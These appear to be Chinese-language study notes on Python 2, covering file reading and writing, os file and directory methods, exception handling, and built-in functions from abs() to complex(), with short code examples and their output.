				File 对象的 close（）方法刷新缓冲区里任何还没写入的信息，并关闭该文件，这之后便不能再进行写入。
				当一个文件对象的引用被重新指定给另一个文件时，Python 会关闭之前的文件。用 close（）方法关闭文件是一个很好的习惯。

				语法：
					fileObject.close();

				例子：
					#!/usr/bin/python
					# -*- coding: UTF-8 -*-
					 
					# 打开一个文件
					fo = open("foo.txt", "wb")
					print "文件名: ", fo.name
					 
					# 关闭打开的文件
					fo.close()

					以上实例输出结果：
					文件名:  foo.txt

		读写文件：
			file对象提供了一系列方法，能让我们的文件访问更轻松。来看看如何使用read()和write()方法来读取和写入文件。
			write()方法
				write()方法可将任何字符串写入一个打开的文件。需要重点注意的是，Python字符串可以是二进制数据，而不是仅仅是文字。

				write()方法不会在字符串的结尾添加换行符('\n')：

				语法：
				fileObject.write(string);

				在这里，被传递的参数是要写入到已打开文件的内容。
				
				例子：
					#!/usr/bin/python
					# -*- coding: UTF-8 -*-
					 
					# 打开一个文件
					fo = open("foo.txt", "wb")
					fo.write( "www.runoob.com!\nVery good site!\n");
					 
					# 关闭打开的文件
					fo.close()

				上述方法会创建foo.txt文件，并将收到的内容写入该文件，并最终关闭文件。如果你打开这个文件，将看到以下内容:
					$ cat foo.txt 
					www.runoob.com!
					Very good site!

			read()方法
				read（）方法从一个打开的文件中读取一个字符串。需要重点注意的是，Python字符串可以是二进制数据，而不是仅仅是文字。
				
				语法：
					fileObject.read([count]);

				在这里，被传递的参数是要从已打开文件中读取的字节计数。该方法从文件的开头开始读入，如果没有传入count，它会尝试尽可能多地读取更多的内容，很可能是直到文件的末尾。
				
				例子：
				这里我们用到以上创建的 foo.txt 文件。
					#!/usr/bin/python
					# -*- coding: UTF-8 -*-
					 
					# 打开一个文件
					fo = open("foo.txt", "r+")
					str = fo.read(10);
					print "读取的字符串是 : ", str
					# 关闭打开的文件
					fo.close()

					以上实例输出结果：
					读取的字符串是 :  www.runoob

			文件位置：
				文件定位
					tell()方法告诉你文件内的当前位置；换句话说，下一次的读写会发生在文件开头这么多字节之后。

					seek（offset [,from]）方法改变当前文件的位置。Offset变量表示要移动的字节数。From变量指定开始移动字节的参考位置。

					如果from被设为0，这意味着将文件的开头作为移动字节的参考位置。如果设为1，则使用当前的位置作为参考位置。如果它被设为2，那么该文件的末尾将作为参考位置。

					例子：

					就用我们上面创建的文件foo.txt。

					#!/usr/bin/python
					# -*- coding: UTF-8 -*-
					 
					# 打开一个文件
					fo = open("foo.txt", "r+")
					str = fo.read(10);
					print "读取的字符串是 : ", str
					 
					# 查找当前位置
					position = fo.tell();
					print "当前文件位置 : ", position
					 
					# 把指针再次重新定位到文件开头
					position = fo.seek(0, 0);
					str = fo.read(10);
					print "重新读取字符串 : ", str
					# 关闭打开的文件
					fo.close()

					以上实例输出结果：

					读取的字符串是 :  www.runoob
					当前文件位置 :  10
					重新读取字符串 :  www.runoob

			重命名和删除文件
				Python的os模块提供了帮你执行文件处理操作的方法，比如重命名和删除文件。

				要使用这个模块，你必须先导入它，然后才可以调用相关的各种功能。

				rename()方法：
					rename()方法需要两个参数，当前的文件名和新文件名。

					语法：
					os.rename(current_file_name, new_file_name)

					例子：
					下例将重命名一个已经存在的文件test1.txt。
						#!/usr/bin/python
						# -*- coding: UTF-8 -*-

						import os
						 
						# 重命名文件test1.txt到test2.txt。
						os.rename( "test1.txt", "test2.txt" )

				remove()方法

					你可以用remove()方法删除文件，需要提供要删除的文件名作为参数。

					语法：

					os.remove(file_name)

					例子：

					下例将删除一个已经存在的文件test2.txt。

					#!/usr/bin/python
					# -*- coding: UTF-8 -*-

					import os
					 
					# 删除一个已经存在的文件test2.txt
					os.remove("test2.txt")

			Python里的目录：

				所有文件都包含在各个不同的目录下，不过Python也能轻松处理。os模块有许多方法能帮你创建，删除和更改目录。
				mkdir()方法
					可以使用os模块的mkdir()方法在当前目录下创建新的目录们。你需要提供一个包含了要创建的目录名称的参数。

					语法：
					os.mkdir("newdir")

					例子：
					下例将在当前目录下创建一个新目录test。
						#!/usr/bin/python
						# -*- coding: UTF-8 -*-

						import os
						 
						# 创建目录test
						os.mkdir("test")

				chdir()方法
					可以用chdir()方法来改变当前的目录。chdir()方法需要的一个参数是你想设成当前目录的目录名称。
					语法：
						os.chdir("newdir")
					例子：
						下例将进入"/home/newdir"目录。

						#!/usr/bin/python
						# -*- coding: UTF-8 -*-

						import os
						 
						# 将当前目录改为"/home/newdir"
						os.chdir("/home/newdir")

				getcwd()方法：
					getcwd()方法显示当前的工作目录。
					语法：
						os.getcwd()

					例子：
					下例给出当前目录：
						#!/usr/bin/python
						# -*- coding: UTF-8 -*-

						import os
						 
						# 给出当前的目录
						print os.getcwd()

				rmdir()方法
					rmdir()方法删除目录，目录名称以参数传递。
					在删除这个目录之前，它的所有内容应该先被清除。
					语法：
						os.rmdir('dirname')
					例子：
						以下是删除" /tmp/test"目录的例子。目录的完全合规的名称必须被给出，否则会在当前目录下搜索该目录。

						#!/usr/bin/python
						# -*- coding: UTF-8 -*-

						import os
						 
						# 删除”/tmp/test”目录
						os.rmdir( "/tmp/test"  )

					文件、目录相关的方法

				三个重要的方法来源能对Windows和Unix操作系统上的文件及目录进行一个广泛且实用的处理及操控，如下：
					File 对象方法: file对象提供了操作文件的一系列方法。
					OS 对象方法: 提供了处理文件及目录的一系列方法。


Python File(文件) 方法
	file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：
		序号				方法及描述
		file.close()		关闭文件。关闭后文件不能再进行读写操作。
		file.flush()		刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。
		file.fileno()		返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。
		file.isatty()		如果文件连接到一个终端设备返回 True，否则返回 False。
		file.next()			返回文件下一行。
		file.read([size])	从文件读取指定的字节数，如果未给定或为负则读取所有。
		file.readline([size])读取整行，包括 "\n" 字符。
		file.readlines([sizehint])读取所有行并返回列表，若给定sizeint>0，返回总和大约为sizeint字节的行, 实际读取值可能比sizhint较大, 因为需要填充缓冲区。
		file.seek(offset[, whence])设置文件当前位置
		file.tell()			返回文件当前位置。
		file.truncate([size])截取文件，截取的字节通过size指定，默认为当前文件位置。
		file.write(str)		将字符串写入文件，没有返回值。
		file.writelines(sequence)向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。

	笔记列表
		在 write 内容后，直接 read 文件输出会为空，是因为指针已经在内容末尾。

		两种解决方式: 其一，先 close 文件，open 后再读取，其二，可以设置指针回到文件最初后再 read

		# -*- coding: UTF-8 -*-

		import os;

		document = open("testfile.txt", "w+");
		print "文件名: ", document.name;
		document.write("这是我创建的第一个测试文件！\nwelcome!");
		print document.tell();
		#输出当前指针位置
		document.seek(os.SEEK_SET);
		#设置指针回到文件最初
		context = document.read();
		print context;
		document.close();		


Python 异常处理

	python提供了两个非常重要的功能来处理python程序在运行中出现的异常和错误。你可以使用该功能来调试python程序。
		异常处理: 本站Python教程会具体介绍。
		断言(Assertions):本站Python教程会具体介绍。 

	python标准异常
		异常名称				描述
		BaseException		所有异常的基类
		SystemExit			解释器请求退出
		KeyboardInterrupt	用户中断执行(通常是输入^C)
		Exception			常规错误的基类
		StopIteration 		迭代器没有更多的值
		GeneratorExit 		生成器(generator)发生异常来通知退出
		StandardError		所有的内建标准异常的基类
		ArithmeticError 	所有数值计算错误的基类
		FloatingPointError 	浮点计算错误
		OverflowError		数值运算超出最大限制
		ZeroDivisionError	除(或取模)零 (所有数据类型)
		AssertionError		断言语句失败
		AttributeError		对象没有这个属性
		EOFError 			没有内建输入,到达EOF 标记
		EnvironmentError 	操作系统错误的基类
		IOError 			输入/输出操作失败
		OSError 			操作系统错误
		WindowsError		系统调用失败
		ImportError 		导入模块/对象失败
		LookupError 		无效数据查询的基类
		IndexError			序列中没有此索引(index)
		KeyError			映射中没有这个键
		MemoryError			内存溢出错误(对于Python 解释器不是致命的)
		NameError			未声明/初始化对象 (没有属性)
		UnboundLocalError 	访问未初始化的本地变量
		ReferenceError		弱引用(Weak reference)试图访问已经垃圾回收了的对象
		RuntimeError 		一般的运行时错误
		NotImplementedError	尚未实现的方法
		SyntaxError	Python 	语法错误
		IndentationError	缩进错误
		TabError			Tab 和空格混用
		SystemError 		一般的解释器系统错误
		TypeError			对类型无效的操作
		ValueError 			传入无效的参数
		UnicodeError 		Unicode 相关的错误
		UnicodeDecodeError 	Unicode 解码时的错误
		UnicodeEncodeError 	Unicode 编码时错误
		UnicodeTranslateError	Unicode 转换时错误
		Warning 			警告的基类
		DeprecationWarning	关于被弃用的特征的警告
		FutureWarning 		关于构造将来语义会有改变的警告
		OverflowWarning		旧的关于自动提升为长整型(long)的警告
		PendingDeprecationWarning	关于特性将会被废弃的警告
		RuntimeWarning 		可疑的运行时行为(runtime behavior)的警告
		SyntaxWarning		可疑的语法的警告
		UserWarning			用户代码生成的警告
	
	
	什么是异常？
		异常即是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。
		一般情况下，在Python无法正常处理程序时就会发生一个异常。
		异常是Python对象，表示一个错误。
		当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。
	
	异常处理
		捕捉异常可以使用try/except语句。
		try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。
		如果你不想在异常发生时结束你的程序，只需在try里捕获它。

	语法：
		以下为简单的try....except...else的语法：
			try:
			<语句>        #运行别的代码
			except <名字>：
			<语句>        #如果在try部份引发了'name'异常
			except <名字>，<数据>:
			<语句>        #如果引发了'name'异常，获得附加的数据
			else:
			<语句>        #如果没有异常发生

		try的工作原理是，当开始一个try语句后，python就在当前程序的上下文中作标记，这样当异常出现时就可以回到这里，try子句先执行，接下来会发生什么依赖于执行时是否出现异常。
		如果当try后的语句执行时发生异常，python就跳回到try并执行第一个匹配该异常的except子句，异常处理完毕，控制流就通过整个try语句（除非在处理异常时又引发新的异常）。
		如果在try后的语句里发生了异常，却没有匹配的except子句，异常将被递交到上层的try，或者到程序的最上层（这样将结束程序，并打印缺省的出错信息）。
		如果在try子句执行时没有发生异常，python将执行else语句后的语句（如果有else的话），然后控制流通过整个try语句。 

	实例
		下面是简单的例子，它打开一个文件，在该文件中的内容写入内容，且并未发生异常：

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		try:
			fh = open("testfile", "w")
			fh.write("这是一个测试文件，用于测试异常!!")
		except IOError:
			print "Error: 没有找到文件或读取文件失败"
		else:
			print "内容写入文件成功"
			fh.close()

		以上程序输出结果：
			$ python test.py 
			内容写入文件成功
			$ cat testfile       # 查看写入的内容
			这是一个测试文件，用于测试异常!!

	实例
		下面是简单的例子，它打开一个文件，在该文件中的内容写入内容，但文件没有写入权限，发生了异常：

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		try:
			fh = open("testfile", "w")
			fh.write("这是一个测试文件，用于测试异常!!")
		except IOError:
			print "Error: 没有找到文件或读取文件失败"
		else:
			print "内容写入文件成功"
			fh.close()

		在执行代码前为了测试方便，我们可以先去掉 testfile 文件的写权限，命令如下：
			chmod -w testfile

		再执行以上代码：
			$ python test.py 
			Error: 没有找到文件或读取文件失败

			
	使用except而不带任何异常类型
		你可以不带任何异常类型使用except，如下实例：
			try:
				正常的操作
			   ......................
			except:
				发生异常，执行这块代码
			   ......................
			else:
				如果没有异常执行这块代码

			以上方式try-except语句捕获所有发生的异常。但这不是一个很好的方式，我们不能通过该程序识别出具体的异常信息。因为它捕获所有的异常。
	
	使用except而带多种异常类型
		你也可以使用相同的except语句来处理多个异常信息，如下所示：
		try:
			正常的操作
		   ......................
		except(Exception1[, Exception2[,...ExceptionN]]]):
		   发生以上多个异常中的一个，执行这块代码
		   ......................
		else:
			如果没有异常执行这块代码

	try-finally 语句
		try-finally 语句无论是否发生异常都将执行最后的代码。

		try:
		<语句>
		finally:
		<语句>    #退出try时总会执行
		raise

		实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			try:
				fh = open("testfile", "w")
				fh.write("这是一个测试文件，用于测试异常!!")
			finally:
				print "Error: 没有找到文件或读取文件失败"

			如果打开的文件没有可写权限，输出如下所示：

			$ python test.py 
			Error: 没有找到文件或读取文件失败

		同样的例子也可以写成如下方式：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			try:
				fh = open("testfile", "w")
				try:
					fh.write("这是一个测试文件，用于测试异常!!")
				finally:
					print "关闭文件"
					fh.close()
			except IOError:
				print "Error: 没有找到文件或读取文件失败"
			#当在try块中抛出一个异常，立即执行finally块代码。finally块中的所有语句执行后，异常被再次触发，并执行except块代码。

	参数的内容不同于异常。
		异常的参数
		一个异常可以带上参数，可作为输出的异常信息参数。
		你可以通过except语句来捕获异常的参数，如下所示：
			try:
				正常的操作
			   ......................
			except ExceptionType, Argument:
				你可以在这输出 Argument 的值...

		变量接收的异常值通常包含在异常的语句中。在元组的表单中变量可以接收一个或者多个值。
		元组通常包含错误字符串，错误数字，错误位置。
			实例

			以下为单个异常的实例：

			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			# 定义函数
			def temp_convert(var):
				try:
					return int(var)
				except ValueError, Argument:
					print "参数没有包含数字\n", Argument

			# 调用函数
			temp_convert("xyz");

			以上程序执行结果如下：

			$ python test.py 
			参数没有包含数字
			invalid literal for int() with base 10: 'xyz'

	触发异常
		我们可以使用raise语句自己触发异常

		raise语法格式如下：
			raise [Exception [, args [, traceback]]]
			语句中Exception是异常的类型（例如，NameError）参数是一个异常参数值。该参数是可选的，如果不提供，异常的参数是"None"。
			最后一个参数是可选的（在实践中很少使用），如果存在，是跟踪异常对象。
		
		实例
			一个异常可以是一个字符串，类或对象。 Python的内核提供的异常，大多数都是实例化的类，这是一个类的实例的参数。
			定义一个异常非常简单，如下所示：
			def functionName( level ):
				if level < 1:
					raise Exception("Invalid level!", level)
					# 触发异常后，后面的代码就不会再执行

		注意：为了能够捕获异常，"except"语句必须有用相同的异常来抛出类对象或者字符串。
			例如我们捕获以上异常，"except"语句如下所示：

			try:
				正常逻辑
			except "Invalid level!":
				触发自定义异常    
			else:
				其余代码

			实例
				#!/usr/bin/python
				# -*- coding: UTF-8 -*-

				# 定义函数
				def mye( level ):
					if level < 1:
						raise Exception("Invalid level!", level)
						# 触发异常后，后面的代码就不会再执行

				try:
					mye(0)                // 触发异常
				except "Invalid level!":
					print 1
				else:
					print 2

				执行以上代码，输出结果为：

				$ python test.py 
				Traceback (most recent call last):
				  File "test.py", line 11, in <module>
					mye(0)
				  File "test.py", line 7, in mye
					raise Exception("Invalid level!", level)
				Exception: ('Invalid level!', 0)

	用户自定义异常
		通过创建一个新的异常类，程序可以命名它们自己的异常。异常应该是典型的继承自Exception类，通过直接或间接的方式。
		
		以下为与RuntimeError相关的实例,实例中创建了一个类，基类为RuntimeError，用于在异常触发时输出更多的信息。
			在try语句块中，用户自定义的异常后执行except块语句，变量 e 是用于创建Networkerror类的实例。
			class Networkerror(RuntimeError):
				def __init__(self, arg):
					self.args = arg

			在你定义以上类后，你可以触发该异常，如下所示：

			try:
				raise Networkerror("Bad hostname")
			except Networkerror,e:
				print e.args

	笔记列表

		0 作为除数：

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		try:
			1 / 0
		except Exception as e:
			'''异常的父类，可以捕获所有的异常'''
			print "0不能被除"
		else:
			'''保护不抛出异常的代码'''
			print "没有异常"
		finally:
			print "最后总是要执行我"


Python OS 文件/目录方法
	os 模块提供了非常丰富的方法用来处理文件和目录。常用的方法如下表所示：
	序号										方法及描述
	os.access(path, mode)						检验权限模式
	os.chdir(path)								改变当前工作目录
	os.chflags(path, flags)						设置路径的标记为数字标记。
	os.chmod(path, mode)						更改权限
	os.chown(path, uid, gid)					更改文件所有者
	os.chroot(path)								改变当前进程的根目录
	os.close(fd)								关闭文件描述符 fd
	os.closerange(fd_low, fd_high)				关闭所有文件描述符，从 fd_low (包含) 到 fd_high (不包含), 错误会忽略
	os.dup(fd)									复制文件描述符 fd
	os.dup2(fd, fd2)							将一个文件描述符 fd 复制到另一个 fd2
	os.fchdir(fd)								通过文件描述符改变当前工作目录
	os.fchmod(fd, mode)							改变一个文件的访问权限，该文件由参数fd指定，参数mode是Unix下的文件访问权限。
	os.fchown(fd, uid, gid)						修改一个文件的所有权，这个函数修改一个文件的用户ID和用户组ID，该文件由文件描述符fd指定。
	os.fdatasync(fd)							强制将文件写入磁盘，该文件由文件描述符fd指定，但是不强制更新文件的状态信息。
	os.fdopen(fd[, mode[, bufsize]])			通过文件描述符 fd 创建一个文件对象，并返回这个文件对象
	os.fpathconf(fd, name)返回一个打开的文件的系统配置信息。name为检索的系统配置的值，它也许是一个定义系统值的字符串，这些名字在很多标准中指定（POSIX.1, Unix 95, Unix 98, 和其它）。
	os.fstat(fd)								返回文件描述符fd的状态，像stat()。
	os.fstatvfs(fd)								返回包含文件描述符fd的文件的文件系统的信息，像 statvfs()
	os.fsync(fd)								强制将文件描述符为fd的文件写入硬盘。
	os.ftruncate(fd, length)					裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。
	os.getcwd()									返回当前工作目录
	os.getcwdu()								返回一个当前工作目录的Unicode对象
	os.isatty(fd)								如果文件描述符fd是打开的，同时与tty(-like)设备相连，则返回true, 否则False。
	os.lchflags(path, flags)					设置路径的标记为数字标记，类似 chflags()，但是没有软链接
	os.lchmod(path, mode)						修改连接文件权限
	os.lchown(path, uid, gid)					更改文件所有者，类似 chown，但是不追踪链接。
	os.link(src, dst)							创建硬链接，名为参数 dst，指向参数 src
	os.listdir(path)							返回path指定的文件夹包含的文件或文件夹的名字的列表。
	os.lseek(fd, pos, how)						设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; 
												SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix，Windows中有效
	os.lstat(path)								像stat(),但是没有软链接
	os.major(device)							从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。
	os.makedev(major, minor)					以major和minor设备号组成一个原始设备号
	os.makedirs(path[, mode])					递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。
	os.minor(device)							从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。
	os.mkdir(path[, mode])						以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。
	os.mkfifo(path[, mode])						创建命名管道，mode 为数字，默认为 0666 (八进制)
	os.mknod(filename[, mode=0600, device])		创建一个名为filename文件系统节点（文件，设备特别文件或者命名pipe）。
	os.open(file, flags[, mode])				打开一个文件，并且设置需要的打开选项，mode参数是可选的
	os.openpty()								打开一个新的伪终端对。返回 pty 和 tty的文件描述符。
	os.pathconf(path, name)						返回相关文件的系统配置信息。
	os.pipe()									创建一个管道. 返回一对文件描述符(r, w) 分别为读和写
	os.popen(command[, mode[, bufsize]])		从一个 command 打开一个管道
	os.read(fd, n)								从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。
	os.readlink(path)							返回软链接所指向的文件
	os.remove(path)								删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。
	os.removedirs(path)							递归删除目录。
	os.rename(src, dst)							重命名文件或目录，从 src 到 dst
	os.renames(old, new)						递归地对目录进行更名，也可以对文件进行更名。
	os.rmdir(path)								删除path指定的空目录，如果目录非空，则抛出一个OSError异常。
	os.stat(path)								获取path指定的路径的信息，功能等同于C API中的stat()系统调用。
	os.stat_float_times([newvalue])				决定stat_result是否以float对象显示时间戳
	os.statvfs(path)							获取指定路径的文件系统统计信息
	os.symlink(src, dst)						创建一个软链接
	os.tcgetpgrp(fd)							返回与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组
	os.tcsetpgrp(fd, pg)						设置与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组为pg。
	os.tempnam([dir[, prefix]])					返回唯一的路径名用于创建临时文件。
	os.tmpfile()								返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口，没有文件描述符，将会自动删除。
	os.tmpnam()									为创建一个临时文件返回一个唯一的路径
	os.ttyname(fd)								返回一个字符串，它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联，则引发一个异常。
	os.unlink(path)								删除文件路径
	os.utime(path, times)						返回指定的path文件的访问和修改的时间。
	os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])输出在文件夹中的文件名通过在树中游走，向上或者向下。
	os.write(fd, str)							写入字符串到文件描述符 fd中. 返回实际写入的字符串长度
	
	参考地址：

    http://kuanghy.github.io/python-os/
    http://python.usyiyi.cn/python_278/library/os.html


Python 内置函数
		 		
	abs()
		描述
			abs() 函数返回数字的绝对值。
		语法
			以下是 abs() 方法的语法:
			abs( x )
		参数
			x -- 数值表达式。
		返回值
			函数返回x（数字）的绝对值。
		实例
			以下展示了使用 abs() 方法的实例：
			#!/usr/bin/python
			 
			print "abs(-45) : ", abs(-45)
			print "abs(100.12) : ", abs(100.12)
			print "abs(119L) : ", abs(119L)

			以上实例运行后输出结果为：

			abs(-45) :  45
			abs(100.12) :  100.12
			abs(119L) :  119
			
	all()
		描述
			all() 函数用于判断给定的可迭代参数 iterable 中的所有元素是否不为 0、''、False 或者 iterable 为空，如果是返回 True，否则返回 False。
			函数等价于：

			def all(iterable):
				for element in iterable:
					if not element:
						return False
				return True
			Python 2.5 以上版本可用。
		
		语法
			以下是 all() 方法的语法:
				all(iterable)

		参数
			iterable -- 元组或列表。

		返回值
			如果iterable的所有元素不为0、''、False或者iterable为空，all(iterable)返回True，否则返回False；
			注意：空元组、空列表返回值为True，这里要特别注意。
		实例
			以下展示了使用 all() 方法的实例：
			>>>all(['a', 'b', 'c', 'd'])  # 列表list，元素都不为空或0
			True
			>>> all(['a', 'b', '', 'd'])   # 列表list，存在一个为空的元素
			False
			>>> all([0, 1，2, 3])          # 列表list，存在一个为0的元素
			False
			   
			>>> all(('a', 'b', 'c', 'd'))  # 元组tuple，元素都不为空或0
			True
			>>> all(('a', 'b', '', 'd'))   # 元组tuple，存在一个为空的元素
			False
			>>> all((0, 1，2, 3))          # 元组tuple，存在一个为0的元素
			False
			   
			>>> all([])             # 空列表
			True
			>>> all(())             # 空元组
			True
			
	 any() 函数
		Python 内置函数 Python 内置函数
		描述
			any() 函数用于判断给定的可迭代参数 iterable 是否全部为空对象，如果都为空、0、false，则返回 False，如果不都为空、0、false，则返回 True。
			函数等价于：
			def any(iterable):
				for element in iterable:
					if element:
						return True
				return False

			Python 2.5 以上版本可用。
		语法
			以下是 any() 方法的语法:
			any(iterable)

		参数
			iterable -- 元组或列表。

		返回值
			如果都为空、0、false，则返回false，如果不都为空、0、false，则返回true。
		
		实例
			以下展示了使用 any() 方法的实例：
			>>>any(['a', 'b', 'c', 'd'])  # 列表list，元素都不为空或0
			True
			 
			>>> any(['a', 'b', '', 'd'])   # 列表list，存在一个为空的元素
			True
			 
			>>> any([0, '', False])        # 列表list,元素全为0,'',false
			False
			 
			>>> any(('a', 'b', 'c', 'd'))  # 元组tuple，元素都不为空或0
			True
			 
			>>> any(('a', 'b', '', 'd'))   # 元组tuple，存在一个为空的元素
			True
			 
			>>> any((0, '', False))        # 元组tuple，元素全为0,'',false
			False
			  
			>>> any([]) # 空列表
			False
			 
			>>> any(()) # 空元组
			False
			
	basestring() 函数
		Python 内置函数 Python 内置函数
		描述
			basestring() 方法是 str 和 unicode 的超类（父类），也是抽象类，因此不能被调用和实例化，但可以被用来判断一个对象是否为 str 或者 unicode 的实例，isinstance(obj, basestring) 等价于 isinstance(obj, (str, unicode))。
		语法
			以下是 basestring() 方法的语法:
			basestring()
		参数
			无
		返回值
			无。
		实例
			以下展示了使用 basestring 函数的实例：
			>>>isinstance("Hello world", str)
			True
			>>> isinstance("Hello world", basestring)
			True
			
	bin() 函数
		Python 内置函数 Python 内置函数
		描述
			bin() 返回一个整数 int 或者长整数 long int 的二进制表示。
		语法
		以下是 bin() 方法的语法:
			bin(x)
		参数
			x -- int 或者 long int 数字
		返回值
			字符串。
		实例
			以下展示了使用 bin 函数的实例：
			>>>bin(10)
			'0b1010'
			>>> bin(20)
			'0b10100'
			
	bool() 函数
		Python 内置函数 Python 内置函数
		描述
			bool() 函数用于将给定参数转换为布尔类型，如果没有参数，返回 False。
			bool 是 int 的子类。
		语法
			以下是 bool() 方法的语法:
			class bool([x])
		参数
			x -- 要进行转换的参数。
		返回值
			返回 Ture 或 False。
		实例
			以下展示了使用 bool 函数的实例：
			>>>bool()
			False
			>>> bool(0)
			False
			>>> bool(1)
			True
			>>> bool(2)
			True
			>>> issubclass(bool, int)  # bool 是 int 子类
			True

	bytearray() 函数
		Python 内置函数 Python 内置函数
		描述
			bytearray() 方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 <= x < 256。
		语法
			bytearray()方法语法：
			class bytearray([source[, encoding[, errors]]])
		参数
			如果 source 为整数，则返回一个长度为 source 的初始化数组；
			如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；
			如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数；
			如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始化 bytearray。
			如果没有输入任何参数，默认就是初始化数组为0个元素。
		返回值
			返回新字节数组。
		实例
			以下实例展示了 bytearray() 的使用方法：
			>>>bytearray()
			bytearray(b'')
			>>> bytearray([1,2,3])
			bytearray(b'\x01\x02\x03')
			>>> bytearray('runoob', 'utf-8')
			bytearray(b'runoob')
			>>>
	
	callable() 函数
		Python 内置函数 Python 内置函数
		描述
			callable() 函数用于检查一个对象是否是可调用的。如果返回True，object仍然可能调用失败；但如果返回False，调用对象ojbect绝对不会成功。
			对于函数, 方法, lambda 函式, 类, 以及实现了 __call__ 方法的类实例, 它都返回 True。
		语法
			callable()方法语法：
			callable(object)
		参数
			object -- 对象
		返回值
			可调用返回 True，否则返回 False。
		实例
			以下实例展示了 callable() 的使用方法：
			>>>callable(0)
			False
			>>> callable("runoob")
			False
			 
			>>> def add(a, b):
			...     return a + b
			... 
			>>> callable(add)             # 函数返回 True
			True
			>>> class A:                  # 类
			...     def method(self):
			...             return 0
			... 
			>>> callable(A)               # 类返回 True
			True
			>>> a = A()
			>>> callable(a)               # 没有实现 __call__, 返回 False
			False
			>>> class B:
			...     def __call__(self):
			...             return 0
			... 
			>>> callable(B)
			True
			>>> b = B()
			>>> callable(b)               # 实现 __call__, 返回 True
			True
	
	chr() 函数
		Python 内置函数 Python 内置函数
		描述
			chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。
		语法
			以下是 chr() 方法的语法:
			chr(i)
		参数
			i -- 可以是10进制也可以是16进制的形式的数字。
		返回值
			返回值是当前整数对应的ascii字符。
		实例
			以下展示了使用 chr() 方法的实例：
			>>>print chr(0x30), chr(0x31), chr(0x61)   # 十六进制
			0 1 a
			>>> print chr(48), chr(49), chr(97)         # 十进制
			0 1 a
	
	classmethod 修饰符
		Python 内置函数 Python 内置函数
		描述
			classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。
		语法
			classmethod 语法：
			classmethod
		参数
			无。
		返回值
			返回函数的类方法。
		实例
			以下实例展示了 classmethod 的使用方法：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class A(object):
				bar = 1
				def func1(self):  
					print ('foo') 
				@classmethod
				def func2(cls):
					print ('func2')
					print (cls.bar)
					cls().func1()   # 调用 foo 方法
			 
			A.func2()               # 不需要实例化

			输出结果为：

			func2
			foo	
			
	cmp() 函数
		Python 数字 Python 数字
		描述
			cmp(x,y) 函数用于比较2个对象，如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1。
		语法
			以下是 cmp() 方法的语法:
			cmp( x, y )
		参数
			x -- 数值表达式。
			y -- 数值表达式。
		返回值
			如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1。
		实例
			以下展示了使用 cmp() 方法的实例：

			#!/usr/bin/python

			print "cmp(80, 100) : ", cmp(80, 100)
			print "cmp(180, 100) : ", cmp(180, 100)
			print "cmp(-80, 100) : ", cmp(-80, 100)
			print "cmp(80, -100) : ", cmp(80, -100)

			以上实例运行后输出结果为：

			cmp(80, 100) :  -1
			cmp(180, 100) :  1
			cmp(-80, 100) :  -1
			cmp(80, -100) :  1

	compile() 函数
		Python 内置函数 Python 内置函数
		描述
			compile() 函数将一个字符串编译为字节代码。
		语法
			以下是 compile() 方法的语法:
			compile(source, filename, mode[, flags[, dont_inherit]])
		参数
			source -- 字符串或者AST（Abstract Syntax Trees）对象。。
			filename -- 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值。
			mode -- 指定编译代码的种类。可以指定为 exec, eval, single。
			flags -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。。
			flags和dont_inherit是用来控制编译源码时的标志
		返回值
			返回表达式执行结果。
		实例
			以下展示了使用 compile 函数的实例：
			>>>str = "for i in range(0,10): print(i)" 
			>>> c = compile(str,'','exec')   # 编译为字节代码对象 
			>>> c
			<code object <module> at 0x10141e0b0, file "", line 1>
			>>> exec(c)
			0
			1
			2
			3
			4
			5
			6
			7
			8
			9
			>>> str = "3 * 4 + 5"
			>>> a = compile(str,'','eval')
			>>> eval(a)
			17
	Python complex() 函数
		Python 内置函数 Python 内置函数
		描述
			complex() 函数用于创建一个值为 real + imag * j 的复数或者转化一个字符串或数为复数。如果第一个参数为字符串，则不需要指定第二个参数。。
		语法
			complex 语法：
			class complex([real[, imag]])
		参数说明：
			real -- int, long, float或字符串；
